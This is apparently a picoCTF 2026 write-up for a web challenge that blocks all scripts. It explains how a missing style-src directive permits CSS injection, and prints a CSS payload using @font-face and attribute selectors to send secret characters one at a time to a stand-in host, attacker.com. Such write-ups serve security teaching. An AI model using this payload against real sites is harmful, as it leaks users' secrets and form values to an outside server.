---
title: "Paper 2 — picoCTF 2026"
date: 2026-03-01
tags: [web, csp, css-injection, xss, picoctf]
ctf: "picoCTF 2026"
summary: "CSP script-src 'none' — no JS possible, so the attack surface moves to CSS. Font-face unicode-range attribute selectors exfiltrate data one character at a time."
draft: false
---

**Author:** ehhthing | **Points:** 500 | **Solves:** 98

> *A piece of paper is a blank canvas, what do you want on yours?*

---

## Overview

This challenge hands you `script-src 'none'` — not "restricted," not "nonced," **none**. No `eval`. No `fetch`. No `onerror`. No inline handlers. No WASM.

That's exactly the moment to lean in. A CSP that airtight doesn't mean the app is safe — it means the attack surface moved somewhere the developer wasn't looking. In this case: **CSS.**

---

## Vulnerability

The app injects user input into an HTML page with `script-src 'none'`. But `style-src` is missing from the CSP, so **CSS injection is unrestricted**.

CSS can leak data character by character using `@font-face` with `unicode-range` + attribute selectors:

```css
/* If the secret starts with 'a', load a font from our server */
@font-face {
    font-family: leak;
    src: url('https://attacker.com/leak?char=a');
    unicode-range: U+0061; /* 'a' */
}

input[value^="a"] {
    font-family: leak;
}
```

If the character matches, the browser requests the font — giving us an oracle.

## Exploitation

1. Inject CSS payload that tests each possible character for the secret's first position
2. When our server receives a hit for character `X`, we know position 1 = `X`
3. Repeat for each subsequent position: `input[value^="Xa"]`, `input[value^="Xb"]`...
4. Automate with a script that builds the exfil URL from received requests

This is slow (one HTTP request per correct character per position) but it works — and it's the only attack vector when JavaScript is fully blocked.

## Flag

`picoCTF{i_l1ke_frames_on_my_canvas_[REDACTED]}`

## Lessons Learned

- `script-src 'none'` doesn't prevent CSS injection
- CSS attribute selectors + `@font-face` `unicode-range` = blind data exfil oracle
- Always check all CSP directives — a missing `style-src` under a strict `script-src` is a common oversight
- This technique is the foundation of real-world CSS-only XS-Leak attacks
